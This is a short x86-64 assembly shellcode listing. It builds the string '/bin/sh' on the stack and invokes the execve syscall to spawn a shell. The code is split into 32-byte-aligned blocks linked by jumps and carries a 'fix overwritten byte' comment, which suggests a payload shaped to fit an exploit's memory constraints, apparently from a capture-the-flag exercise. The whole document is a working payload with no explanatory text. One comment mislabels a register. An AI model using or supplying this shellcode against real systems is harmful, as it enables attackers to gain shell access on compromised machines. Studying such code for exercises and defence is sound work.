global _start

_start:
    db 0xf7             ; fix overwritten byte
    mov eax, 0x68732f   ; /sh\x00
    jmp next1

align 32
next1:
    shl rax, 32
    jmp next2

align 32
next2:
    add rax, 0x6e69622f ; /bin
    jmp next3

align 32
next3:
    push rax
    mov rdi, rsp        ; rdi = "/bin/sh"
    xor esi, esi        ; rsi = NULL
    jmp next4

align 32
next4:
    xor edx, edx        ; rdi = NULL
    xor eax, eax
    jmp next5

align 32
next5:
    mov al, 59          ; rax = SYS_execve
    syscall

align 32
